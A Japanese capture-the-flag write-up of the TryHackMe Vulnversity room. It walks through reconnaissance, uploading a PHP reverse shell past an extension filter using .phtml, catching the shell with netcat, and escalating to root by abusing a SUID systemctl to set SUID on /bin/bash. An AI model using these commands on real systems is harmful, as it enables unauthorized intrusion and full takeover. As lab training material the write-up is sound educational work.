# Vulnversity - TryHackMe Writeup

## 攻撃チェーン概要

```
nmap(偵察) → gobuster(ディレクトリ列挙) → /internal/ 発見
→ アップロードフォーム発見 → .phtml でフィルターバイパス
→ リバースシェル取得(www-data)
→ SUID付き /bin/systemctl 発見
→ 悪意あるサービスで /bin/bash にSUID付与
→ root シェル取得
```

---

## Step 1: 偵察（Reconnaissance）

```bash
nmap -sV -oN nmap.log 10.48.146.167
```

- `-sV`: サービスバージョン検出
- `-oN nmap.log`: 結果をファイルに保存
- **ポート3333** でWebサーバーが稼働していることを発見

---

## Step 2: ディレクトリ列挙（Directory Enumeration）

```bash
gobuster dir -u http://10.48.146.167:3333 -w /usr/share/wordlists/dirb/common.txt
```

### 結果

| パス           | ステータス | 備考                                |
| -------------- | ---------- | ----------------------------------- |
| /css/          | 301        | 静的アセット（普通）                |
| /fonts/        | 301        | 静的アセット（普通）                |
| /images/       | 301        | 静的アセット（普通）                |
| /js/           | 301        | 静的アセット（普通）                |
| **/internal/** | **301**    | **怪しい！通常のWebサイトにはない** |

### /internal/ をさらに列挙

```bash
gobuster dir -u http://10.48.146.167:3333/internal/ -w /usr/share/wordlists/dirb/common.txt
```

- `index.php` → ファイルアップロードフォーム
- `uploads/` → アップロードされたファイルの保存先

> **Q: このサイトは何？**
> → PHPで動くファイルアップロードフォーム。入力検証が甘く、悪意あるPHPファイルをアップロード→サーバー上で実行できる脆弱性がある。「サイトを変更する」のではなく、**サーバー上で任意のコードを実行して侵入する**のが目的。

---

## Step 3: リバースシェルの準備

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Kali内蔵のPHPリバースシェルをコピーし、以下を自分の環境に合わせて編集：

```php
$ip = '自分のtun0 IP';  // ip addr show tun0 で確認
$port = 1234;            // リスナーのポート
```

---

## Step 4: 拡張子フィルターのバイパス

`.php` はブロックされた（"Extension not allowed"）。

### 自動テストスクリプト

```bash
#!/bin/bash
extensions=("php" "php3" "php4" "php5" "phtml")
for ext in "${extensions[@]}"; do
    echo "Testing: .$ext"
    cp php-reverse-shell.php "shell.$ext"
    result=$(curl -s -X POST "http://10.48.146.167:3333/internal/index.php" \
        -F "file=@shell.$ext" | grep -i "extension not allowed")
    if [ -z "$result" ]; then
        echo "[+] SUCCESS: .$ext uploaded!"
    else
        echo "[-] FAILED: .$ext blocked"
    fi
    rm -f "shell.$ext"
done
```

### スクリプトの各行解説

| コード                                  | 説明                                                                            |
| --------------------------------------- | ------------------------------------------------------------------------------- |
| `extensions=(...)`                      | テストする拡張子の配列                                                          |
| `cp php-reverse-shell.php "shell.$ext"` | シェルファイルを別拡張子でコピー                                                |
| `curl -s -X POST ... -F "file=@..."`    | `-s`=サイレント、`-F`=フォームのファイルアップロード（`@`はファイル内容を送る） |
| `grep -i "extension not allowed"`       | レスポンスにブロックメッセージがあるか検索                                      |
| `if [ -z "$result" ]`                   | `-z`=文字列が空か判定。空＝ブロックされなかった＝成功                           |

> **Q: `sh` で実行したら `Syntax error: "(" unexpected` になった**
> → `sh` はdash等が使われ配列をサポートしない。`bash` で実行すること。shebangも `#!/bin/bash` にする（`#/bin/zsh` は `!` が抜けている）。

### 結果: `.phtml` でアップロード成功

---

## Step 5: リバースシェル取得

### ターミナル1: リスナー起動

```bash
nc -lvnp 1234
```

### ターミナル2: シェルをアップロード＆実行

1. `shell.phtml` を `/internal/index.php` からアップロード
2. ブラウザで `http://10.48.146.167:3333/internal/uploads/shell.phtml` にアクセス
3. リスナーにシェルが返ってくる

> **Q: "WARNING: Failed to daemonise. Connection refused (111)" が出た**
> → リスナーが起動していないか、`$ip`/`$port` の設定が間違っている。`nc -lvnp` を先に起動し、tun0のIPを確認すること。

---

## Step 6: SUID バイナリの調査

```bash
find / -perm /6000 2>/dev/null
```

> **Q: 6000 がSUID？**
>
> - SUID = `4000`（実行時に所有者の権限で動く）
> - SGID = `2000`（実行時にグループの権限で動く）
> - `6000` = `4000 + 2000` = 両方
> - `/` はOR検索 = どちらか一方でも設定されていれば対象
>
> **SUID とは？**
> そのファイルを実行すると、実行者に関係なく**ファイル所有者の権限**で動く特殊パーミッション。
> 例: `/bin/systemctl` の所有者がrootでSUID付き → 一般ユーザーが実行してもroot権限で動作。

### 結果: `/bin/systemctl` がSUID付き（通常はあり得ない）

---

## Step 7: 権限昇格（Privilege Escalation）

### 手順

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
/bin/bash -p
```

### 各行の詳細

| コマンド                          | 説明                                                                                                                                            |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `TF=$(mktemp).service`            | `/tmp/tmp.XXXXXX.service` のようなランダムな一時ファイル名を生成。ランダムなのは**他ファイルとの名前衝突を防ぐため**（`/tmp` は全ユーザー共有） |
| `echo '[Service]...' > $TF`       | 悪意あるsystemdサービスファイルを作成                                                                                                           |
| `Type=oneshot`                    | 一回だけ実行して終了するタイプ                                                                                                                  |
| `ExecStart=...chmod +s /bin/bash` | サービス起動時に `/bin/bash` にSUIDビットを付与                                                                                                 |
| `WantedBy=multi-user.target`      | 通常のマルチユーザーモードで有効化                                                                                                              |
| `/bin/systemctl link $TF`         | 自作サービスをsystemdに登録（SUID付きなのでroot権限で実行される）                                                                               |
| `/bin/systemctl enable --now $TF` | `enable`=有効化、`--now`=即座に起動。root権限で `chmod +s /bin/bash` が実行される                                                               |
| `/bin/bash -p`                    | SUIDによるroot権限を維持してシェルを起動                                                                                                        |

> **Q: パーミッションのどこが `s` に変わる？**
>
> ```
> 変更前: -rwxr-xr-x
> 変更後: -rwsr-sr-x
>            ^   ^
> ```
>
> - 4文字目 `x` → `s` : SUID（所有者の実行ビット）
> - 7文字目 `x` → `s` : SGID（グループの実行ビット）

> **Q: `-p` オプションとは？**
> **privileged mode（特権モード）**。通常bashはSUIDで起動されても安全のためroot権限を自動的に捨てる。`-p` でこの安全機構を無効化し、root権限を維持したままシェルが起動する。
>
> ```
> -p なし: bash起動 → root権限を捨てる → 一般ユーザーのまま
> -p あり: bash起動 → root権限を維持 → rootシェル取得
> ```

---

## Step 8: フラグ取得

```bash
whoami    # root と表示されれば成功
cat /root/root.txt
```

---

## 学んだこと

- **ディレクトリ列挙**で隠しパスを発見する重要性
- PHPの拡張子は `.php` 以外にも `.phtml`, `.php3`, `.php5` 等があり、フィルターバイパスに使える
- **SUID**ビットが付いた不適切なバイナリは権限昇格の入口になる
- `systemctl` にSUIDがあれば、任意のサービスを作成してroot権限でコマンドを実行できる
- `/bin/bash -p` の `-p` はSUID権限を維持するために必須
